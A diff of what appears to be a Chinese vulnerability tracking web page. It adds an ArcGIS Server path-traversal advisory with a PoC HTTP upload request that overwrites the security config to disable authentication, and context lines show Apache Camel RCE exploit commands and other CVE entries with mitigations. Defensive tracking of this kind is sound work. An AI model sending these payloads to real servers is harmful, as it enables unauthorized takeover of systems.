@@ -333,9 +333,9 @@ td .tag {
 <option value="8">标签</option>
 <option value="9">验真人</option>
 </select>
-<span class="stat-badge total">共 171 条</span>
+<span class="stat-badge total">共 172 条</span>
 <span class="stat-badge zday">0day 14</span>
-<span class="stat-badge oney">1day 36</span>
+<span class="stat-badge oney">1day 37</span>
 <span class="stat-badge nday">nday 121</span>
 </div>
 <div class="table-wrap">
@@ -347,7 +347,19 @@ PoC:
  curl http://target:8080/exploit/attack  # CAmelExecCommandExecutable 注入 → RCE
  git clone https://github.com/sarojkpr/CVE-2026-40453
  cd CVE-2026-40453 &amp;&amp; mvn package -DskipTests &amp;&amp; docker compose up -d</td><td class="cell-hover" onclick="copyCell(this)">升级至 4.14.6 / 4.18.2 / 4.20.0+；注意主版本升级可能涉及 API 变更；
-临时缓解：在消息处理管道中对 Camel 内部头做大小写不敏感清除；限制 JMS/CoAP 等协议的未授权访问；审查路由中 exec/file 等高危 producer。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">FFmpeg</span></td><td class="cell-hover" onclick="copyCell(this)">FFmpeg MagicYUV PixelSmash 堆缓冲区溢出漏洞 CVE-2026-8461</td><td><span class="tag">缓冲区溢出</span></td><td class="cell-hover" onclick="copyCell(this)">&lt; 8.1.2</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">FFmpeg MagicYUV 解码器在处理奇数水平切片高度的 YUV420P 视频帧时，色度缓冲区大小计算存在不匹配，分配端和对齐端使用不同取整规则，导致一行级别的堆缓冲区溢出。攻击者可将恶意数据嵌入 AVI/MKV/MOV 文件中，触发解码器越界写入。CVSS 8.8。
+临时缓解：在消息处理管道中对 Camel 内部头做大小写不敏感清除；限制 JMS/CoAP 等协议的未授权访问；审查路由中 exec/file 等高危 producer。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Esri</span></td><td class="cell-hover" onclick="copyCell(this)">Esri ArcGIS Server 路径遍历致文件覆盖漏洞 CVE-2026-9181</td><td><span class="tag">任意文件写入</span></td><td class="cell-hover" onclick="copyCell(this)">ArcGIS Server &lt;= 12.0（10.x 已 EOL 不受补丁覆盖）</td><td class="cell-hover" onclick="copyCell(this)">/arcgis/rest/services/System/PublishingTools/GPServer/uploads/upload</td><td class="cell-hover" onclick="copyCell(this)">UploadsManager 将用户可控的 filename 原样拼入 FileOutputStream 写入路径，无规范化校验。通过 ../ 遍历可覆盖 config-store/security/security-config.json 关闭 token 认证，或覆盖 super/super.json 修改超管密码，获取完全管理权限。需 service 开启 uploads 能力（默认 System/PublishingTools/GPServer 支持）。
+
+PoC:
+ POST /arcgis/rest/services/System/PublishingTools/GPServer/uploads/upload HTTP/1.1
+ Host: target
+ Content-Type: multipart/form-data; boundary=----B
+ ------B
+ Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../../../../../../config-store/security/security-config.json&quot;
+ {&quot;securityEnabled&quot;:false,...}
+ ------B--</td><td class="cell-hover" onclick="copyCell(this)">安装 SEC2026U2 补丁（ArcGIS-120-S-SEC2026U2-Patch，QI S-120-P-1454）；
+补丁在 UploadsManager 的 registerItem/registerServiceItem/uploadItem×2/uploadServiceItem 五个入口新增 PathUtil.containsRelativePath 校验；
+10.x 已 EOL，需升级或网络层缓解：限制 /arcgis/rest/services/ 路径仅允许可信 IP 访问；
+监控 config-store/security/security-config.json 和 config-store/super/super.json 的文件变更。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">FFmpeg</span></td><td class="cell-hover" onclick="copyCell(this)">FFmpeg MagicYUV PixelSmash 堆缓冲区溢出漏洞 CVE-2026-8461</td><td><span class="tag">缓冲区溢出</span></td><td class="cell-hover" onclick="copyCell(this)">&lt; 8.1.2</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">FFmpeg MagicYUV 解码器在处理奇数水平切片高度的 YUV420P 视频帧时，色度缓冲区大小计算存在不匹配，分配端和对齐端使用不同取整规则，导致一行级别的堆缓冲区溢出。攻击者可将恶意数据嵌入 AVI/MKV/MOV 文件中，触发解码器越界写入。CVSS 8.8。
 
 PoC 参考: https://github.com/ray-goldman/ffmpeg-jellyfix</td><td class="cell-hover" onclick="copyCell(this)">升级 FFmpeg 至 8.1.2+；若业务不需要 MagicYUV 解码器可在构建时禁用；排查应用是否携带内置 FFmpeg 版本（系统包升级不覆盖内置库）；使用 AddressSanitizer 和 UndefinedBehaviorSanitizer 进行模糊测试。</td><td>20260713</td><td><span class="label label-1day">1day</span></td><td>AdySec</td></tr><tr><td><span class="tag">Gardyn</span></td><td class="cell-hover" onclick="copyCell(this)">Gardyn IoT Hub 硬编码凭据致未授权 RCE CVE-2026-13768</td><td><span class="tag">远程代码执行</span></td><td class="cell-hover" onclick="copyCell(this)">Gardyn 固件 &lt; master.627 / Cloud API &lt; 2.12.2026</td><td class="cell-hover" onclick="copyCell(this)"></td><td class="cell-hover" onclick="copyCell(this)">Gardyn IoT Hub 暴露 Azure IoT Hub iothubowner 密钥，攻击者可利用该密钥调用 Registry Manager 函数获取所有设备连接详情，在选定设备上执行任意命令，并可横向渗透至受害者家庭网络。
 
